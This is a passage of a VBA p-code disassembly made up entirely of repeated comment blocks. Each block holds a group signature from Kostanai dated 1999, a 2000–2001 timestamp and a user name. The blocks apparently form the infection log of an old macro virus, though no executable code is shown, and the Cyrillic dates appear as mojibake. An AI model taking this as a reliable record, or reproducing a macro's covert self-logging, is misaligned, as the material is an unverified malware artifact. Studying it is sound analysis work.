' 	QuoteRem 0x0000 0x0023 " 11:54:34 - ïîíåäåëüíèê, 8 ÿíâ 2001"
' Line #537:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #538:
' 	QuoteRem 0x0000 0x0000 ""
' Line #539:
' Line #540:
' Line #541:
' Line #542:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #543:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #544:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #545:
' 	QuoteRem 0x0000 0x001F " 14:36:35 - âòîðíèê, 9 ÿíâ 2001"
' Line #546:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #547:
' 	QuoteRem 0x0000 0x0000 ""
' Line #548:
' Line #549:
' Line #550:
' Line #551:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #552:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #553:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #554:
' 	QuoteRem 0x0000 0x001F " 15:05:48 - âòîðíèê, 9 ÿíâ 2001"
' Line #555:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #556:
' 	QuoteRem 0x0000 0x0000 ""
' Line #557:
' Line #558:
' Line #559:
' Line #560:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #561:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #562:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #563:
' 	QuoteRem 0x0000 0x001F " 18:23:03 - âòîðíèê, 9 ÿíâ 2001"
' Line #564:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #565:
' 	QuoteRem 0x0000 0x0000 ""
' Line #566:
' Line #567:
' Line #568:
' Line #569:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #570:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #571:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #572:
' 	QuoteRem 0x0000 0x001E " 10:32:55 - ñðåäà, 10 ÿíâ 2001"
' Line #573:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #574:
' 	QuoteRem 0x0000 0x0000 ""
' Line #575:
' Line #576:
' Line #577:
' Line #578:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #579:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #580:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #581:
' 	QuoteRem 0x0000 0x0020 " 09:33:04 - ïÿòíèöà, 12 ÿíâ 2001"
' Line #582:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #583:
' 	QuoteRem 0x0000 0x0000 ""
' Line #584:
' Line #585:
' Line #586:
' Line #587:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #588:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #589:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #590:
' 	QuoteRem 0x0000 0x0020 " 13:48:13 - ïÿòíèöà, 12 ÿíâ 2001"
' Line #591:
' 	QuoteRem 0x0000 0x0005 " áâã¤"
' Line #592:
' 	QuoteRem 0x0000 0x0000 ""
' Line #593:
' Line #594:
' Line #595:
' Line #596:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #597:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #598:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #599:
' 	QuoteRem 0x0000 0x0024 " 01:03:22 - ïîíåäåëüíèê, 15 ÿíâ 2001"
' Line #600:
' 	QuoteRem 0x0000 0x0007 " Jordan"
' Line #601:
' 	QuoteRem 0x0000 0x0000 ""
' Line #602:
' Line #603:
' Line #604:
' Line #605:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #606:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #607:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #608:
' 	QuoteRem 0x0000 0x001F " 18:08:12 - ïÿòíèöà, 2 ôåâ 2001"
' Line #609:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #610:
' 	QuoteRem 0x0000 0x0000 ""
' Line #611:
' Line #612:
' Line #613:
' Line #614:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #615:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #616:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #617:
' 	QuoteRem 0x0000 0x0020 " 17:49:01 - ïÿòíèöà, 16 ôåâ 2001"
' Line #618:
' 	QuoteRem 0x0000 0x0005 " Serg"
' Line #619:
' 	QuoteRem 0x0000 0x0000 ""
' Line #620:
' Line #621:
' Line #622:
' Line #623:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #624:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #625:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #626:
' 	QuoteRem 0x0000 0x0020 " 13:12:13 - ñóááîòà, 17 ôåâ 2001"
' Line #627:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #628:
' 	QuoteRem 0x0000 0x0000 ""
' Line #629:
' Line #630:
' Line #631:
' Line #632:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #633:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #634:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #635:
' 	QuoteRem 0x0000 0x0020 " 13:35:12 - ñóááîòà, 17 ôåâ 2001"
' Line #636:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #637:
' 	QuoteRem 0x0000 0x0000 ""
' Line #638:
' Line #639:
' Line #640:
' Line #641:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #642:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #643:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #644:
' 	QuoteRem 0x0000 0x0020 " 13:35:19 - ñóááîòà, 17 ôåâ 2001"
' Line #645:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #646:
' 	QuoteRem 0x0000 0x0000 ""
' Line #647:
' Line #648:
' Line #649:
' Line #650:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #651:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #652:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #653:
' 	QuoteRem 0x0000 0x0020 " 13:35:26 - ñóááîòà, 17 ôåâ 2001"
' Line #654:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #655:
' 	QuoteRem 0x0000 0x0000 ""
' Line #656:
' Line #657:
' Line #658:
' Line #659:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #660:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #661:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #662:
' 	QuoteRem 0x0000 0x0020 " 13:35:31 - ñóááîòà, 17 ôåâ 2001"
' Line #663:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #664:
' 	QuoteRem 0x0000 0x0000 ""
' Line #665:
' Line #666:
' Line #667:
' Line #668:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #669:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #670:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #671:
' 	QuoteRem 0x0000 0x0020 " 13:35:37 - ñóááîòà, 17 ôåâ 2001"
' Line #672:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #673:
' 	QuoteRem 0x0000 0x0000 ""
' Line #674:
' Line #675:
' Line #676:
' Line #677:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #678:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #679:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #680:
' 	QuoteRem 0x0000 0x0020 " 13:35:44 - ñóááîòà, 17 ôåâ 2001"
' Line #681:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #682:
' 	QuoteRem 0x0000 0x0000 ""
' Line #683:
' Line #684:
' Line #685:
' Line #686:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #687:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #688:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #689:
' 	QuoteRem 0x0000 0x0020 " 13:35:49 - ñóááîòà, 17 ôåâ 2001"
' Line #690:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #691:
' 	QuoteRem 0x0000 0x0000 ""
' Line #692:
' Line #693:
' Line #694:
' Line #695:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #696:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #697:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #698:
' 	QuoteRem 0x0000 0x0020 " 13:35:55 - ñóááîòà, 17 ôåâ 2001"
' Line #699:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #700:
' 	QuoteRem 0x0000 0x0000 ""
' Line #701:
' Line #702:
' Line #703:
' Line #704:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #705:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #706:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #707:
' 	QuoteRem 0x0000 0x0020 " 13:36:01 - ñóááîòà, 17 ôåâ 2001"
' Line #708:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #709:
' 	QuoteRem 0x0000 0x0000 ""
' Line #710:
' Line #711:
' Line #712:
' Line #713:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #714:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #715:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #716:
' 	QuoteRem 0x0000 0x0020 " 13:45:17 - ñóááîòà, 17 ôåâ 2001"
' Line #717:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #718:
' 	QuoteRem 0x0000 0x0000 ""
' Line #719:
' Line #720:
' Line #721:
' Line #722:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #723:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #724:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #725:
' 	QuoteRem 0x0000 0x0020 " 13:49:57 - ñóááîòà, 17 ôåâ 2001"
' Line #726:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #727:
' 	QuoteRem 0x0000 0x0000 ""
' Line #728:
' Line #729:
' Line #730:
' Line #731:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #732:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #733:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #734:
' 	QuoteRem 0x0000 0x0020 " 14:40:56 - ñóááîòà, 17 ôåâ 2001"
' Line #735:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #736:
' 	QuoteRem 0x0000 0x0000 ""
' Line #737:
' Line #738:
' Line #739:
' Line #740:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #741:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #742:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #743:
' 	QuoteRem 0x0000 0x0020 " 14:41:22 - ñóááîòà, 17 ôåâ 2001"
' Line #744:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #745:
' 	QuoteRem 0x0000 0x0000 ""
' Line #746:
' Line #747:
' Line #748:
' Line #749:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #750:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #751:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #752:
' 	QuoteRem 0x0000 0x0020 " 16:51:31 - ñóááîòà, 17 ôåâ 2001"
' Line #753:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #754:
' 	QuoteRem 0x0000 0x0000 ""
' Line #755:
' Line #756:
' Line #757:
' Line #758:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #759:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #760:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #761:
' 	QuoteRem 0x0000 0x0024 " 12:45:33 - ïîíåäåëüíèê, 19 ôåâ 2001"
' Line #762:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #763:
' 	QuoteRem 0x0000 0x0000 ""
' Line #764:
' Line #765:
' Line #766:
' Line #767:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #768:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #769:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #770:
' 	QuoteRem 0x0000 0x0024 " 15:22:59 - ïîíåäåëüíèê, 19 ôåâ 2001"
' Line #771:
' 	QuoteRem 0x0000 0x0005 " Alex"
' Line #772:
' 	QuoteRem 0x0000 0x0000 ""
' Line #773:
' Line #774:
' Line #775:
' Line #776:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #777:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #778:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #779:
' 	QuoteRem 0x0000 0x001E " 12:21:21 - ñðåäà, 14 ìàð 2001"
' Line #780:
' 	QuoteRem 0x0000 0x0006 " User6"
' Line #781:
' 	QuoteRem 0x0000 0x0000 ""
' Line #782:
' Line #783:
' Line #784:
' Line #785:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #786:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #787:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #788:
' 	QuoteRem 0x0000 0x001E " 12:24:42 - ñðåäà, 14 ìàð 2001"
' Line #789:
' 	QuoteRem 0x0000 0x0006 " User6"
' Line #790:
' 	QuoteRem 0x0000 0x0000 ""
' Line #791:
' Line #792:
' Line #793:
' Line #794:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #795:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #796:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #797:
' 	QuoteRem 0x0000 0x001E " 13:01:34 - ñðåäà, 14 ìàð 2001"
' Line #798:
' 	QuoteRem 0x0000 0x0006 " User6"
' Line #799:
' 	QuoteRem 0x0000 0x0000 ""
' Line #800:
' Line #801:
' Line #802:
' Line #803:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #804:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #805:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #806:
' 	QuoteRem 0x0000 0x001E " 14:21:03 - ñðåäà, 14 ìàð 2001"
' Line #807:
' 	QuoteRem 0x0000 0x0006 " User6"
' Line #808:
' 	QuoteRem 0x0000 0x0000 ""
' Line #809:
' Line #810:
' Line #811:
' Line #812:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #813:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #814:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #815:
' 	QuoteRem 0x0000 0x001E " 14:51:41 - ñðåäà, 14 ìàð 2001"
' Line #816:
' 	QuoteRem 0x0000 0x0006 " User6"
' Line #817:
' 	QuoteRem 0x0000 0x0000 ""
' Line #818:
' Line #819:
' Line #820:
' Line #821:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #822:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #823:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #824:
' 	QuoteRem 0x0000 0x001E " 13:53:57 - ñðåäà, 14 ìàð 2001"
' Line #825:
' 	QuoteRem 0x0000 0x0006 " User6"
' Line #826:
' 	QuoteRem 0x0000 0x0000 ""
' Line #827:
' Line #828:
' Line #829:
' Line #830:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #831:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #832:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #833:
' 	QuoteRem 0x0000 0x0024 " 11:09:33 - ïîíåäåëüíèê, 27 ìàð 2000"
' Line #834:
' 	QuoteRem 0x0000 0x0007 " Òàëãàò"
' Line #835:
' 	QuoteRem 0x0000 0x0000 ""
' Line #836:
' Line #837:
' Line #838:
' Line #839:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #840:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #841:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #842:
' 	QuoteRem 0x0000 0x0020 " 11:22:54 - ÷åòâåðã, 29 ìàð 2001"
' Line #843:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #844:
' 	QuoteRem 0x0000 0x0000 ""
' Line #845:
' Line #846:
' Line #847:
' Line #848:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #849:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #850:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #851:
' 	QuoteRem 0x0000 0x0020 " 12:06:03 - ÷åòâåðã, 29 ìàð 2001"
' Line #852:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #853:
' 	QuoteRem 0x0000 0x0000 ""
' Line #854:
' Line #855:
' Line #856:
' Line #857:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #858:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #859:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #860:
' 	QuoteRem 0x0000 0x0020 " 12:09:07 - ÷åòâåðã, 29 ìàð 2001"
' Line #861:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #862:
' 	QuoteRem 0x0000 0x0000 ""
' Line #863:
' Line #864:
' Line #865:
' Line #866:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #867:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #868:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #869:
' 	QuoteRem 0x0000 0x0020 " 12:09:42 - ÷åòâåðã, 29 ìàð 2001"
' Line #870:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #871:
' 	QuoteRem 0x0000 0x0000 ""
' Line #872:
' Line #873:
' Line #874:
' Line #875:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #876:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #877:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #878:
' 	QuoteRem 0x0000 0x0020 " 12:10:18 - ÷åòâåðã, 29 ìàð 2001"
' Line #879:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #880:
' 	QuoteRem 0x0000 0x0000 ""
' Line #881:
' Line #882:
' Line #883:
' Line #884:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #885:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #886:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #887:
' 	QuoteRem 0x0000 0x0020 " 12:14:22 - ÷åòâåðã, 29 ìàð 2001"
' Line #888:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #889:
' 	QuoteRem 0x0000 0x0000 ""
' Line #890:
' Line #891:
' Line #892:
' Line #893:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #894:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #895:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #896:
' 	QuoteRem 0x0000 0x0020 " 12:15:02 - ÷åòâåðã, 29 ìàð 2001"
' Line #897:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #898:
' 	QuoteRem 0x0000 0x0000 ""
' Line #899:
' Line #900:
' Line #901:
' Line #902:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #903:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #904:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #905:
' 	QuoteRem 0x0000 0x0020 " 12:21:20 - ÷åòâåðã, 29 ìàð 2001"
' Line #906:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #907:
' 	QuoteRem 0x0000 0x0000 ""
' Line #908:
' Line #909:
' Line #910:
' Line #911:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #912:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #913:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #914:
' 	QuoteRem 0x0000 0x0020 " 12:24:37 - ÷åòâåðã, 29 ìàð 2001"
' Line #915:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #916:
' 	QuoteRem 0x0000 0x0000 ""
' Line #917:
' Line #918:
' Line #919:
' Line #920:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #921:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #922:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #923:
' 	QuoteRem 0x0000 0x0020 " 12:27:06 - ÷åòâåðã, 29 ìàð 2001"
' Line #924:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #925:
' 	QuoteRem 0x0000 0x0000 ""
' Line #926:
' Line #927:
' Line #928:
' Line #929:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #930:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #931:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #932:
' 	QuoteRem 0x0000 0x0020 " 12:28:10 - ÷åòâåðã, 29 ìàð 2001"
' Line #933:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #934:
' 	QuoteRem 0x0000 0x0000 ""
' Line #935:
' Line #936:
' Line #937:
' Line #938:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #939:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #940:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #941:
' 	QuoteRem 0x0000 0x0020 " 12:29:59 - ÷åòâåðã, 29 ìàð 2001"
' Line #942:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #943:
' 	QuoteRem 0x0000 0x0000 ""
' Line #944:
' Line #945:
' Line #946:
' Line #947:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #948:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #949:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #950:
' 	QuoteRem 0x0000 0x0020 " 12:31:30 - ÷åòâåðã, 29 ìàð 2001"
' Line #951:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #952:
' 	QuoteRem 0x0000 0x0000 ""
' Line #953:
' Line #954:
' Line #955:
' Line #956:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #957:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #958:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #959:
' 	QuoteRem 0x0000 0x0020 " 13:29:37 - ÷åòâåðã, 29 ìàð 2001"
' Line #960:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #961:
' 	QuoteRem 0x0000 0x0000 ""
' Line #962:
' Line #963:
' Line #964:
' Line #965:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #966:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #967:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #968:
' 	QuoteRem 0x0000 0x0020 " 13:31:21 - ÷åòâåðã, 29 ìàð 2001"
' Line #969:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #970:
' 	QuoteRem 0x0000 0x0000 ""
' Line #971:
' Line #972:
' Line #973:
' Line #974:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #975:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #976:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #977:
' 	QuoteRem 0x0000 0x0020 " 15:10:55 - ÷åòâåðã, 29 ìàð 2001"
' Line #978:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #979:
' 	QuoteRem 0x0000 0x0000 ""
' Line #980:
' Line #981:
' Line #982:
' Line #983:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #984:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #985:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #986:
' 	QuoteRem 0x0000 0x0020 " 15:52:34 - ÷åòâåðã, 29 ìàð 2001"
' Line #987:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #988:
' 	QuoteRem 0x0000 0x0000 ""
' Line #989:
' Line #990:
' Line #991:
' Line #992:
' 	QuoteRem 0x0000 0x0016 " * DSR & FHS , KGU EMF"
' Line #993:
' 	QuoteRem 0x0000 0x0023 " 00:15:54  -  Wednesday, 22.12.1999"
' Line #994:
' 	QuoteRem 0x0000 0x002A " KZ, Kostanai, KGU EMF Applied Mathematics"
' Line #995:
' 	QuoteRem 0x0000 0x0020 " 16:05:57 - ÷åòâåðã, 29 ìàð 2001"
' Line #996:
' 	QuoteRem 0x0000 0x0008 " Pentium"
' Line #997:
